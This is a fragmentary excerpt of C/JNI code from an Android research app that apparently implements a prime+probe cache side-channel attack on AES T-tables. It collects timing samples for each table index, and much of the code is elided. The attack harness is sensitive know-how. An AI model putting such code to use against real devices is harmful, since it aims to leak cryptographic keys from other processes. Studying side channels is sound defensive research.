...
#define AES_SAMPLE_SUM 100 //sample sum
...
uint64_t getPPTime(JNIEnv *env, libcache_session_t *libcache_session, unsigned char *inaes, uint64_t *tmp, uint64_t *histogram, int index); //
...
Java_www_buaa_edu_cn_testlibcache_TestLibCache_callNativeLibCacheAttack(JNIEnv* env, jobject obj, jint jcpu)
{
	...
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		...
		for (int j0 = 0; j0 < AES_TABLE_LENGTH; j0++) {
			sample[i]->t0_time[j0] = getPPTime(env, libcache_session, inaes, tmp, histogram, tables.t0_si[j0]);
		}
		for (int j1 = 0; j1 < AES_TABLE_LENGTH; j1++) {
			sample[i]->t1_time[j1] = getPPTime(env, libcache_session, inaes, tmp, histogram, tables.t1_si[j1]);
		}
		for (int j2 = 0; j2 < AES_TABLE_LENGTH; j2++) {
			sample[i]->t2_time[j2] = getPPTime(env, libcache_session, inaes, tmp, histogram, tables.t2_si[j2]);
		}
		for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++) {
			sample[i]->t3_time[j3] = getPPTime(env, libcache_session, inaes, tmp, histogram, tables.t3_si[j3]);
		}
		LOGI("%d", i);		
	}
...
uint64_t getPPTime(JNIEnv *env, libcache_session_t *libcache_session, unsigned char *inaes, uint64_t *tmp, uint64_t *histogram, int index) {
	...
	jdoubleArray jhistogram1 = (*env)->NewDoubleArray(env, PP_MAX_TIME / HISTOGRAM_SCALE);
	jdoubleArray jhistogram2 = (*env)->NewDoubleArray(env, PP_MAX_TIME / HISTOGRAM_SCALE);
	...
	jdouble measure = (*env)->CallDoubleMethod(env, ts, getSp);

	LOGI("-*-measure %f-*-", measure);
